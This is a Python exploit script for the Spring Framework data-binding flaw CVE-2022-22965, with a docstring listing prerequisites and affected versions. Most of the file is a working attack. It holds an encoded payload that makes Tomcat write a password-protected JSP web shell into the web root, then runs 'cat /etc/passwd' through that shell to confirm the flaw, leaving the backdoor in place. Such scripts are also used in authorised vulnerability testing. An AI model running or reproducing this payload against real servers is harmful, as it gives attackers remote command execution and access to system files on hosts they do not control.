"""
@Author: exiashow
@File: spring_dataBinding_rce.py
@Date: 2024/3/4 17:40
@Desc: CVE-2022-22965, Remote code execution vulnerability caused by Spring framework Data Binding and JDK 9+
A Spring MVC or Spring WebFlux application running on JDK 9+ may be vulnerable to remote code execution (RCE) via data binding.
The specific exploit requires the application to run on Tomcat as a WAR deployment.
If the application is deployed as a Spring Boot executable jar, i.e. the default, it is not vulnerable to the exploit.
However, the nature of the vulnerability is more general, and there may be other ways to exploit it
@Summary:
    These are the prerequisites for the exploit:
        JDK 9 or higher
        Apache Tomcat as the Servlet container
        Packaged as WAR
        spring-webmvc or spring-webflux dependency
    Affected Spring Products and Versions
        Spring Framework
        5.3.0 to 5.3.17
        5.2.0 to 5.2.19
        Older, unsupported versions are also affected
"""
import requests
import sys
import time

# The function of this code is to disable the InsecureRequestWarning warning in the urllib3 library.
# InsecureRequestWarning warning will appear in the following situations:
#   Send a request to the HTTPS server without verifying the server's SSL certificate
#   Send requests to HTTPS servers when using weak encryption algorithms or expired SSL certificates
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

headers = {
    "suffix": "%>//",
    "c1": "Runtime",
    "c2": "<%",
    "DNT": "1",
    "Content-Type": "application/x-www-form-urlencoded",
}
data = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="


class SpringDataBinding_rce(object):
    def __init__(self, url):
        self.url = url

    def run(self):
        self.url = self.url + ":8080"
        try:
            requests.post(self.url,
                          data=data,
                          headers=headers,
                          verify=False,
                          allow_redirects=False,
                          timeout=15)
            time.sleep(10)
            shell = self.url + "/tomcatwar.jsp?pwd=j&cmd=cat /etc/passwd"

            shell_result = requests.get(shell,
                                        verify=False,
                                        allow_redirects=False,
                                        stream=True,
                                        timeout=15)

            if shell_result.status_code == 200 and "root" in shell_result.text:
                return "[Warning] Java Spring vulnerability discovered: CVE-2022-22965"
            else:
                return None
        except requests.exceptions.ConnectionError:
            pass


if __name__ == '__main__':
    fallingSword = SpringDataBinding_rce(sys.argv[1])
    fallingSword.run()
